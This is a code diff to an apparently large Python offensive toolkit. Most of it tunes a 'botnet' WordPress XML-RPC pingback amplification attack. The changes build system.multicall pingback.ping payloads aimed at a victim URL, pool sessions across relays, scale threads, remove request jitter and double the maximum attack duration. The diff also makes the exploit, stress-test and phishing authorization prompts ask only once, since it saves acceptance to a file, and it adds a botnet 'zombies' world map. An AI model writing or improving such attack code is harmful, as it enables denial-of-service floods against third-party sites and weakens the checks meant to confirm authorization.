@@ -3327,11 +3327,44 @@ EXPLOIT_DISCLAIMER = f"""
   ╚══════════════════════════════════════════════════════╝{RST}
 """
 
+RESPONSIBILITY_FILE = "accepted_responsibility.json"
+
+def _check_responsibility(category):
+    import json, os
+    if os.path.exists(RESPONSIBILITY_FILE):
+        try:
+            with open(RESPONSIBILITY_FILE, "r") as f:
+                data = json.load(f)
+            return data.get(category, False)
+        except Exception:
+            pass
+    return False
+
+def _save_responsibility(category):
+    import json, os
+    data = {}
+    if os.path.exists(RESPONSIBILITY_FILE):
+        try:
+            with open(RESPONSIBILITY_FILE, "r") as f:
+                data = json.load(f)
+        except Exception:
+            pass
+    data[category] = True
+    try:
+        with open(RESPONSIBILITY_FILE, "w") as f:
+            json.dump(data, f)
+    except Exception:
+        pass
+
 
 def exploit_disclaimer():
+    if _check_responsibility("exploit"): return True
     print(EXPLOIT_DISCLAIMER)
     confirm = input(f"  {Y}Do you have authorization? (yes/no):{RST} ").strip().lower()
-    return confirm in ("yes", "y", "si", "s")
+    if confirm in ("yes", "y", "si", "s"):
+        _save_responsibility("exploit")
+        return True
+    return False
 
 
 # ─── 31. SQL Injection Tester ─────────────────────────────────────────────────
@@ -6734,6 +6767,7 @@ STRESS_DISCLAIMER = f"""
 
 
 def stress_disclaimer():
+    if _check_responsibility("stress"): return True
     print(STRESS_DISCLAIMER)
     c1 = input(f"  {R}Do you have WRITTEN authorization to stress-test this target? (yes/no):{RST} ").strip().lower()
     if c1 not in ("yes", "y", "si", "s"):
@@ -6742,6 +6776,7 @@ def stress_disclaimer():
     if c2.upper() != "I ACCEPT ALL RESPONSIBILITY":
         print_err("Aborted. You must accept responsibility to use these tools.")
         return False
+    _save_responsibility("stress")
     return True
 
 
@@ -8285,19 +8320,27 @@ def _botnet_xmlrpc_amplify(relays):
 
     threads_per = input(f"  {Y}Threads per relay (1-50) [10]:{RST} ").strip() or "10"
     batch_size = input(f"  {Y}Pings per multicall batch (1-500) [50]:{RST} ").strip() or "50"
-    duration = input(f"  {Y}Duration in seconds (1-300) [30]:{RST} ").strip() or "30"
+    duration = input(f"  {Y}Duration in seconds (1-600) [30]:{RST} ").strip() or "30"
 
     try:
         threads_per = min(50, max(1, int(threads_per)))
         batch_size = min(500, max(1, int(batch_size)))
-        duration = min(300, max(1, int(duration)))
+        duration = min(600, max(1, int(duration)))
     except ValueError:
         print_err("Invalid numbers")
         return
 
+    # ── Smart thread scaling for large relay counts ──
+    # Cap total threads to avoid OS limits (~4096 safe on most systems)
+    MAX_TOTAL_THREADS = 2048
+    total_desired = threads_per * len(relays)
+    if total_desired > MAX_TOTAL_THREADS:
+        threads_per = max(1, MAX_TOTAL_THREADS // len(relays))
+        total_desired = threads_per * len(relays)
+
     print(f"\n  {R}  VICTIM:   {W}{victim}{RST}")
     print(f"  {R}  RELAYS:   {W}{len(relays)}{RST}")
-    print(f"  {R}  THREADS:  {W}{threads_per}/relay = {threads_per * len(relays)} total{RST}")
+    print(f"  {R}  THREADS:  {W}{threads_per}/relay = {total_desired} total{RST}")
     print(f"  {R}  BATCH:    {W}{batch_size} pingbacks per multicall request{RST}")
     print(f"  {R}  DURATION: {W}{duration}s{RST}")
     print(f"  {R}  MULTIPLIER: {W}1 HTTP req = {batch_size} pingbacks to victim{RST}")
@@ -8308,79 +8351,119 @@ def _botnet_xmlrpc_amplify(relays):
         return
 
     stop_event = threading.Event()
-    # counters track actual pingbacks (batch_size per successful request)
-    counters = {r["url"]: [0] for r in relays}
-    http_reqs = {r["url"]: [0] for r in relays}
-    errors = [0]
+
+    # ── Atomic-like counters using threading.Lock for thread safety ──
+    _counter_lock = threading.Lock()
+    counters = {}      # relay_url -> pingback count
+    http_reqs = {}     # relay_url -> http request count
+    for r in relays:
+        counters[r["url"]] = 0
+        http_reqs[r["url"]] = 0
+    total_errors = [0]
     start_time = time.time()
+
+    # ── Pre-build payload template parts (avoid per-request string concat) ──
+    _payload_prefix = (
+        '<?xml version="1.0"?>'
+        '<methodCall><methodName>system.multicall</methodName>'
+        '<params><param><value><array><data>'
+    )
+    _payload_suffix = '</data></array></value></param></params></methodCall>'
+
+    def _build_call_block(relay_url):
+        """Build a single pingback.ping call XML block."""
+        post_id = random.randint(1, 9999)
+        return (
+            '<value><struct>'
+            '<member><name>methodName</name><value><string>pingback.ping</string></value></member>'
+            '<member><name>params</name><value><array><data>'
+            f'<value><string>{victim}</string></value>'
+            f'<value><string>{relay_url}/?p={post_id}</string></value>'
+            '</data></array></value></member>'
+            '</struct></value>'
+        )
 
     def _build_multicall_payload(relay_url, n):
         """Build a system.multicall XML payload with n pingback.ping calls."""
-        calls = []
-        for _ in range(n):
-            post_id = random.randint(1, 9999)
-            calls.append(
-                '<value><struct>'
-                '<member><name>methodName</name><value><string>pingback.ping</string></value></member>'
-                '<member><name>params</name><value><array><data>'
-                f'<value><string>{victim}</string></value>'
-                f'<value><string>{relay_url}/?p={post_id}</string></value>'
-                '</data></array></value></member>'
-                '</struct></value>'
-            )
-        return (
-            '<?xml version="1.0"?>'
-            '<methodCall><methodName>system.multicall</methodName>'
-            '<params><param><value><array><data>'
-            + ''.join(calls)
-            + '</data></array></value></param></params></methodCall>'
-        )
+        calls = ''.join(_build_call_block(relay_url) for _ in range(n))
+        return _payload_prefix + calls + _payload_suffix
 
-    def pingback_worker(relay_url, counter, req_counter):
+    # ── Session pool: one session per relay, shared across its workers ──
+    _sessions = {}
+    for r in relays:
+        s = requests.Session()
+        s.verify = False
+        s.headers.update({"Content-Type": "text/xml"})
+        # Pre-set the adapter pool size so connections are reused
+        adapter = requests.adapters.HTTPAdapter(
+            pool_connections=threads_per,
+            pool_maxsize=threads_per,
+            max_retries=0,
+        )
+        s.mount("http://", adapter)
+        s.mount("https://", adapter)
+        _sessions[r["url"]] = s
+
+    def pingback_worker(relay_url):
         xmlrpc_url = relay_url.rstrip("/") + "/xmlrpc.php"
-        sess = requests.Session()
+        sess = _sessions[relay_url]
+        local_pings = 0
+        local_reqs = 0
+        local_errors = 0
+        # Build payload once and rotate post_ids less frequently for speed
+        payload = _build_multicall_payload(relay_url, batch_size)
+        rebuild_every = 20  # Rebuild payload every N requests to vary post_ids
+        req_count = 0
         while not stop_event.is_set():
             try:
-                payload = _build_multicall_payload(relay_url, batch_size)
                 resp = sess.post(
                     xmlrpc_url,
                     data=payload,
                     headers={
-                        "Content-Type": "text/xml",
                         "User-Agent": f"WordPress/{random.randint(5,6)}.{random.randint(0,9)}",
                     },
-                    timeout=15,
-                    verify=False,
+                    timeout=12,
                 )
-                if resp.status_code == 200 and "methodResponse" in resp.text:
-                    counter[0] += batch_size
-                    req_counter[0] += 1
+                if resp.status_code == 200 and b"methodResponse" in resp.content:
+                    local_pings += batch_size
+                    local_reqs += 1
                 else:
-                    errors[0] += 1
+                    local_errors += 1
+                resp.close()
             except Exception:
-                errors[0] += 1
-            # Small jitter to avoid burst patterns
-            time.sleep(random.uniform(0.05, 0.3))
+                local_errors += 1
+            req_count += 1
+            if req_count % rebuild_every == 0:
+                payload = _build_multicall_payload(relay_url, batch_size)
+            # Flush local counters to shared state periodically (reduce lock contention)
+            if req_count % 5 == 0:
+                with _counter_lock:
+                    counters[relay_url] += local_pings
+                    http_reqs[relay_url] += local_reqs
+                    total_errors[0] += local_errors
+                local_pings = local_reqs = local_errors = 0
+        # Final flush
+        with _counter_lock:
+            counters[relay_url] += local_pings
+            http_reqs[relay_url] += local_reqs
+            total_errors[0] += local_errors
 
     def stats_printer():
         while not stop_event.is_set():
             elapsed = time.time() - start_time
             if elapsed > 0:
-                parts = []
-                total = 0
-                total_reqs = 0
-                for u, cnt in counters.items():
-                    domain = urlparse(u).netloc
-                    parts.append(f"{domain}:{cnt[0]}")
-                    total += cnt[0]
-                    total_reqs += http_reqs[u][0]
+                with _counter_lock:
+                    total = sum(counters.values())
+                    total_r = sum(http_reqs.values())
+                    err = total_errors[0]
                 rps = total / elapsed
+                active = len(relays)
                 sys.stdout.write(
-                    f"\r  {Y}[AMPLIFY]{RST} Pingbacks: {G}{total}{RST}  "
-                    f"HTTP reqs: {W}{total_reqs}{RST}  "
-                    f"Rate: {C}{rps:.0f} pings/s{RST}  "
-                    f"Errors: {R}{errors[0]}{RST}  "
-                    f"Relays: {' | '.join(parts)}    "
+                    f"\r  {Y}[AMPLIFY]{RST} Pingbacks: {G}{total:,}{RST}  "
+                    f"HTTP: {W}{total_r:,}{RST}  "
+                    f"Rate: {C}{rps:,.0f}/s{RST}  "
+                    f"Err: {R}{err:,}{RST}  "
+                    f"Relays: {G}{active}{RST}    "
                 )
                 sys.stdout.flush()
             time.sleep(1)
@@ -8389,14 +8472,21 @@ def _botnet_xmlrpc_amplify(relays):
     st.daemon = True
     st.start()
 
+    # ── Staggered thread launch to avoid thundering herd ──
     workers = []
-    for r in relays:
+    relay_list = [r["url"] for r in relays]
+    batch_launch = 50  # Launch threads in batches
+    launched = 0
+    for relay_url in relay_list:
         for _ in range(threads_per):
-            w = threading.Thread(target=pingback_worker,
-                                 args=(r["url"], counters[r["url"]], http_reqs[r["url"]]))
+            w = threading.Thread(target=pingback_worker, args=(relay_url,))
             w.daemon = True
             w.start()
             workers.append(w)
+            launched += 1
+            # Stagger: sleep briefly every batch_launch threads
+            if launched % batch_launch == 0:
+                time.sleep(0.05)
 
     try:
         time.sleep(duration)
@@ -8404,30 +8494,54 @@ def _botnet_xmlrpc_amplify(relays):
         pass
     finally:
         stop_event.set()
-        time.sleep(1)
+        # Give workers time to flush final counters
+        time.sleep(1.5)
+
+    # Close all pooled sessions
+    for s in _sessions.values():
+        try:
+            s.close()
+        except Exception:
+            pass
 
     elapsed = time.time() - start_time
-    total_pings = sum(c[0] for c in counters.values())
-    total_reqs = sum(c[0] for c in http_reqs.values())
+    total_pings = sum(counters.values())
+    total_reqs_final = sum(http_reqs.values())
     print(f"\n\n  {Y}{'═' * 60}{RST}")
     print(f"  {Y}  MULTICALL AMPLIFICATION RESULTS{RST}")
     print(f"  {Y}{'═' * 60}{RST}")
     print_row("Victim", victim)
     print_row("Batch Size", f"{batch_size} pings/multicall")
-    for r in relays:
-        cnt = counters[r["url"]][0]
-        reqs = http_reqs[r["url"]][0]
-        domain = urlparse(r["url"]).netloc
-        print(f"  {C}{domain:<35}{RST} {W}{cnt} pingbacks ({reqs} HTTP reqs){RST}")
+
+    # Show top 20 relays by pingback count + aggregate for the rest
+    sorted_relays = sorted(relays, key=lambda r: counters.get(r["url"], 0), reverse=True)
+    shown = 0
+    hidden_pings = 0
+    hidden_reqs = 0
+    hidden_count = 0
+    for r in sorted_relays:
+        cnt = counters.get(r["url"], 0)
+        reqs = http_reqs.get(r["url"], 0)
+        if shown < 20:
+            domain = urlparse(r["url"]).netloc
+            print(f"  {C}{domain:<35}{RST} {W}{cnt:,} pingbacks ({reqs:,} HTTP reqs){RST}")
+            shown += 1
+        else:
+            hidden_pings += cnt
+            hidden_reqs += reqs
+            hidden_count += 1
+    if hidden_count > 0:
+        print(f"  {Y}... and {hidden_count} more relays:{RST} {W}{hidden_pings:,} pingbacks ({hidden_reqs:,} HTTP reqs){RST}")
+
     print(f"  {Y}{'─' * 60}{RST}")
-    print_row("Total Pingbacks", str(total_pings))
-    print_row("Total HTTP Reqs", str(total_reqs))
+    print_row("Total Pingbacks", f"{total_pings:,}")
+    print_row("Total HTTP Reqs", f"{total_reqs_final:,}")
     print_row("Amplification", f"{batch_size}x per request")
-    print_row("Errors", str(errors[0]))
+    print_row("Errors", f"{total_errors[0]:,}")
     print_row("Duration", f"{elapsed:.1f}s")
-    print_row("Avg Rate", f"{total_pings / elapsed:.0f} pingbacks/s" if elapsed > 0 else "N/A")
+    print_row("Avg Rate", f"{total_pings / elapsed:,.0f} pingbacks/s" if elapsed > 0 else "N/A")
     print(f"\n  {W}Each multicall bundles {G}{batch_size}{RST} {W}pingback.ping calls in 1 HTTP request.{RST}")
-    print(f"  {W}Effective amplification: {G}~{total_pings}x{RST} {W}HTTP requests to victim from {total_reqs} actual requests sent.{RST}")
+    print(f"  {W}Effective amplification: {G}~{total_pings:,}x{RST} {W}HTTP requests to victim from {total_reqs_final:,} actual requests sent.{RST}")
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -8450,6 +8564,7 @@ PHISHING_DISCLAIMER = f"""
 
 
 def phishing_disclaimer():
+    if _check_responsibility("phishing"): return True
     print(PHISHING_DISCLAIMER)
     c1 = input(f"  {R}Do you have WRITTEN authorization for phishing simulation? (yes/no):{RST} ").strip().lower()
     if c1 not in ("yes", "y", "si", "s"):
@@ -8458,6 +8573,7 @@ def phishing_disclaimer():
     if c2.upper() != "I ACCEPT ALL RESPONSIBILITY":
         print_err("Aborted.")
         return False
+    _save_responsibility("phishing")
     return True
 
 
@@ -9894,9 +10010,58 @@ def show_menu():
     print(f"  {Y}║{RST}  {G} A.{RST} {W}{ai_txt:<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {M} S.{RST} {W}{'Stealth Mode Config':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {R} B.{RST} {W}{bot_txt:<{w - 6}}{Y}║{RST}")
+    print(f"  {Y}║{RST}  {C} W.{RST} {W}{'Botnet Zombies World Map':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}║{RST}  {R} 0.{RST} {W}{'Exit':<{w - 6}}{Y}║{RST}")
     print(f"  {Y}╚{'═' * w}╝{RST}")
 
+
+def launch_web_map():
+    print_header("Botnet World Map")
+    print(f"  {C}Starting Web Interface...{RST}")
+    import threading
+    import http.server
+    import socketserver
+    import webbrowser
+    PORT = 8080
+    
+    api_dir = os.path.join(os.path.dirname(__file__), "api")
+    if not os.path.isdir(api_dir):
+        print_err("api folder not found")
+        return
+        
+    geoscript = os.path.join(api_dir, "geolocate.py")
+    if os.path.exists(geoscript):
+        print(f"  {Y}Updating geolocation data (botnet_geo.json)...{RST}")
+        os.system(f"cd '{api_dir}' && python3 geolocate.py")
+        print_ok("Geolocation updated.")
+        
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=api_dir, **kwargs)
+            
+        def do_GET(self):
+            if self.path == '/':
+                self.path = '/map.html'
+            elif self.path == '/api/zombies':
+                self.path = '/botnet_geo.json'
+            return super().do_GET()
+
+    try:
+        # Check if port is already open
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(1)
+            in_use = s.connect_ex(("127.0.0.1", PORT)) == 0
+            
+        if not in_use:
+            httpd = socketserver.TCPServer(("", PORT), Handler)
+            thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+            thread.start()
+            print_ok(f"Server started at http://localhost:{PORT}")
+            
+        webbrowser.open(f"http://localhost:{PORT}/map.html")
+        print(f"  {C}Check your browser for the map dashboard.{RST}")
+    except Exception as e:
+        print_err(f"Could not start server / open browser: {e}")
 
 def main():
     os.system("clear")
@@ -9925,6 +10090,14 @@ def main():
         if choice.lower() == "b":
             try:
                 botnet_manager()
+            except KeyboardInterrupt:
+                print(f"\n  {Y}Interrupted.{RST}")
+            pause()
+            continue
+
+        if choice.lower() == "w":
+            try:
+                launch_web_map()
             except KeyboardInterrupt:
                 print(f"\n  {Y}Interrupted.{RST}")
             pause()
